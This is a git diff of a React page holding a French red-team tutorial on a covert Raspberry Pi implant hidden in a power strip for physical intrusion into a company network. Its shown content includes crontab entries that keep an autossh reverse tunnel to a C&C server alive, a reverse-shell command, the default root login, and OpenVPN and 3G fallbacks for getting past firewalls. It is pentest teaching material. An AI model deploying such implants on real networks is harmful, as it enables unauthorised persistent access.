@@ -9,27 +9,29 @@ import Raspap02 from "../img/raspap_02.png"
 class Redteam extends React.Component {
     render() {
       return (
-        <div className="article">
+      <div className="article">
 
         <h1>Redteam</h1>
    
         <hr/>
         <p className="tabulation">Une nouvelle tendance émerge du côté des attaques informatiques, les techniques d’intrusion se professionnalisent, s’industrialisent et s’étendent dans le temps. Là où des « amateurs » n’avaient qu’à exécuter un script sur un système vulnérable autrefois, des équipes expérimentées peuvent aujourd’hui passer des mois sur une seule et même cible, <strong>APT (Advanced Persitent Threat).</strong></p>
 
-        <p className="tabulation">Pour s'adapter les entreprises de sécurité propose depuis peu une nouvelle approche dans la réalisation d’un test d’intrusion : le <strong>RedTeam</strong>. <br/><br/>L’objectif est de dérouler un scénario complet d'attaque depuis l'externe jusqu’à l'interne et la capacité d'effectuer des actions critiques au sein du SI ciblé. Par rapport à un pentest traditionnel la durée est généralement plus longue et les moyens, plus variés (ex: phishing des employés, intrusions physiques dans le locaux).</p>
+        <p className="tabulation">Pour s'adapter les entreprises de sécurité propose depuis peu une nouvelle approche dans la réalisation d’un test d’intrusion : le <strong>RedTeam</strong>. <br/><br/>L’objectif est de dérouler un scénario complet d'attaque depuis l'externe jusqu’à l'interne et la capacité d'effectuer des actions critiques au sein du SI ciblé. Par rapport à un pentest traditionnel la durée est généralement plus longue et les moyens, plus variés (ex: phishing des employés, intrusions physiques dans les locaux).</p>
 
         <br/>
         <br/>
 
         <h2>Contexte</h2>
-        <p className="tabulation">Notre projet consiste à créer un implant qu'il suffirait de déposer chez un client pour avoir un accès à distance à leur réseau interne. Cela représenterait la phase de compromission initiale dans le schéma de redteam suivant: <br/>
+        <p className="tabulation">Notre projet consiste à créer un implant qu'il suffira de déposer chez un client pour avoir un accès à distance au réseau interne. Cela représente la phase de compromission initiale dans le schéma de redteam suivant: <br/>
 
         <img id="methodoredteam" src={Methodo} alt="méthodologie redteam"/>
         <br/>  
 
-        Un scénario possible serait de pénétrer dans la société et d'y dissimuler l'implant pour obtenir notre accès à distance via une connexion OpenVPN ou un tunnel SSH inversé.<br/><br/>  
+        Le scénario de la mission sera de pénétrer physiquement dans la société et d'y dissimuler notre backdoor pour obtenir un accès à distance via une connexion OpenVPN ou un tunnel SSH inversé.<br/><br/>  
 
-        Des outils tels que la <strong>LAN Turtle</strong> existent déjà mais l'on souhaiterait avoir le contrôle total de nos outils. Plusieurs méthodes doivent être implémentées au cas où le pare-feu du client bloquerait certains flux sortants. Notre backdoor doit également avoir une méthode alternative pour se connecter au cas où leurs règles de pare-feu bloqueraient le trafic, une configuration sans fil pour l'appareil est donc à envisager.
+        Des outils tels que la <strong>LAN Turtle</strong> existent déjà mais l'on souhaite avoir le contrôle total de nos outils. <br/><br/>
+        
+        Plusieurs méthodes se doivent d'être implémentées au cas où des règles de pare-feu bloqueraient certains flux sortants et une méthode alternative de connexion via Wifi ou GSM est également à envisager.
         </p>
 
         <img id="kaliraspberry" src={KaliRaspberry} alt="kali raspberry"/>
@@ -62,7 +64,7 @@ class Redteam extends React.Component {
         <br/>
 
         <h2>Système d'exploitation</h2>
-        <p className="tabulation">Comme système d'exploitation, on retiendra la distribution <strong>Kali Linux</strong> car elle dispose déjà d'outils de pentest intégrés, pas besoin d'installation et c'est simple à utiliser pour tous les pentesters.</p>
+        <p className="tabulation">On retiendra la distribution <strong>Kali Linux</strong> car elle dispose déjà d'outils de pentest intégrés, pas besoin d'installation et c'est simple à utiliser pour tous pentesters.</p>
         
         <br/>
 
@@ -74,16 +76,17 @@ class Redteam extends React.Component {
         <br/>
 
         <h2>Comment dissimuler la Raspberry ?</h2>
-        <p>L'une des méthodes la plus simple et efficace est de la cacher à l'intérieur d'une multiprise comme suit :</p>
+        <p>Une méthode efficace est de la cacher à l'intérieur d'une multiprise comme suit :</p>
         <img id="hide_raspberry" src={Hide} alt="idée pour chacher raspberry"/>
 
+        <p>Cet objet du quotidien dans une entreprise a l'avantage de fournir l'alimentation et le câble réseau à la carte sans éveiller trop de soupçons de la part des employés</p>
         <hr/>
 
         <h2>Configuration initiale</h2>
-        <div>Les différentes étapes:
+        <div>
           <ol>
-            <li>Configurer l'image Kali pour la carte MicroSD</li>
-            <li>Configurer un point d'accès WiFi avec hostapd</li>
+            <li>Installer l'image Kali pour la carte MicroSD</li>
+            <li>Configurer un point d'accès WiFi</li>
             <li>Configurer un tunnel SSH inverse automatique</li>
             <li>Configurer le client et le serveur OpenVPN</li>
           </ol>
@@ -96,21 +99,21 @@ class Redteam extends React.Component {
 
         <div>
           <h4>Pour Windows</h4>
-          Avec un adaptateur MicroSD vers USB connectez la carte MicroSD à votre système Windows.<br/>
+          Connectez la carte MicroSD à la machine Windows. <br/>
           Décompressez l'archive.<br/>
           Utilisez Win32DiskImager ou Rufus pour écrire l'image disque Kali sur la carte MicroSD.<br/>
 
           <br/> 
 
           <h4>Pour Linux</h4>
-          Avec un adaptateur MicroSD vers USB connectez la carte MicroSD au système Linux.<br/>
-          Utilisez la commande <strong>dd</strong> pour créer une image du fichier Kali sur la carte MicroSD.<br/>
+          Connectez la carte MicroSD au système Linux.<br/>
+          Utilisez la commande <strong>dd</strong> pour créer l'image du fichier Kali sur la carte MicroSD.<br/>
 
           <br/>
 
           <h4>Installation</h4>
-          Mettez la Raspberry sous secteur, branchez un clavier et un écran avec un câble HDMI et connectez-vous à Kali Linux avec le nom d'utilisateur "root" et le mot de passe "toor".<br/>
-          Veillez à connecter un câble Ethernet sur la Raspberry Pi 4 pour l'accès internet, elle devrait alors automatiquement récupérer une adresse IP via DHCP.
+          Alimentez la Raspberry, connectez clavier/souris/écran et connectez-vous à Kali Linux avec le nom d'utilisateur "root" et le mot de passe "toor".<br/>
+          Veillez à connecter un câble Ethernet sur la Raspberry pour l'accès internet elle devrait alors récupérer automatiquement une adresse IP via DHCP.
           
         </div>
 
@@ -252,22 +255,26 @@ class Redteam extends React.Component {
         </div> */}
 
         <h3>Configurer un reverse shell automatique</h3>
-        <p>Cette section suppose qu'on dispose d'un serveur de commande et de contrôle (C&C) accessible sur Internet et que SSH est activé. Pour le POC j'ai pour le moment utilisé mon serveur perso</p>   
+        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C{"&"}C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^</p>   
 
         <div id="wifi">
         apt install autossh <br/>
-        ssh-keygen (laisser les paramètres par défaut) <br/><br/>
+        ssh-keygen (laisser les paramètres par défaut) 
+        </div>
 
-        scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/<br/>
 
-        [Sur le serveur]
+        <div id="wifi">scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/</div>
+
+
+        <strong>[Sur le serveur]</strong><br/>
         Ajouter le contenu id_rsa.pub à ~/.ssh/authorized_keys ou bien créer ce fichier:<br/>
 
-        cat id_rsa.pub >> ~/.ssh/authorized_keys<br/>
+        <div id="wifi">cat id_rsa.pub >> ~/.ssh/authorized_keys</div>
 
-        [Sur la Raspberry]<br/>
-        On va créer une crontab qui exécute autossh après chaque boot et est relancée toutes les 5 min (en cas de coupure)
+        <p><strong>[Sur la Raspberry]</strong><br/>
+        On va créer une crontab qui exécute autossh après chaque boot et est relancée toutes les 5 min (en cas de coupure)</p>
 
+        <div id="wifi">
         vim /bin/autossh-connect.sh<br/>
 
         #!/bin/bash<br/>
@@ -280,18 +287,18 @@ class Redteam extends React.Component {
 
         crontab -e<br/>
         
-        Ajouter à la fin du fichier : <br/>
+        #Ajouter à la fin du fichier : <br/>
 
         @reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1<br/>
         */5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1<br/>
+        </div>
         
-        Voilà, à présent la RaspBerry va se connecter à chaque boot à notre serveur de contrôle<br/> 
-        Exécutez la commande suivante sur le serveur pour obtenir le reverse shell<br/>
+        <p>Voilà, à présent la RaspBerry va se connecter à chaque boot à notre serveur de contrôle</p>
+        <p>Exécutez la commande suivante sur le serveur pour obtenir le reverse shell :</p>
 
-        ssh root@localhost -p 6667 (creds de Kali)
-        </div>      
+        <div id="wifi">ssh root@localhost -p 6667 (creds de Kali)</div>      
         
-        <h3>Configurer un client et un serveur Openvpn</h3>
+        <h3>Configurer un client et un serveur OpenVPN</h3>
         <p className="tabulation">En plus du reverse shell SSH pour accéder à notre Raspberry, il serait également intéressant de configurer l'appareil pour utiliser une connexion OpenVPN sur le port 443 (HTTPS). 
         <br/><br/>
         Étant donné que la Raspberry sera probablement déposée à l'arrière d'un switch dans une entreprise, nous ne pourrons pas nous y connecter directement. Par conséquent, la Raspberry doit d'abord sortir par le port 443 vers notre serveur OpenVPN Access Server. Depuis notre machine d'attaque nous devrons également nous connecter au serveur VPN. Cela est une assurance du fait que si le client bloque le port 22 sortant pour SSH, nous aurons une autre option pour se connecter via le port 443 (HTTPS).
@@ -463,6 +470,7 @@ class Redteam extends React.Component {
           </p>
 
           <p>Une fois wvdial configuré, il suffit de taper la commande <strong>sudo wvdial </strong> afin de lancer la connexion 3G.Plusieurs informations vont défiler à l'écran dont l'adresse IP publique et les DNS fournis par le FAI. CTRL+C pour couper la connexion, cela affichera le temps pendant laquelle la connexion a été maintenue.</p>
+         
       </div>
       );
     }
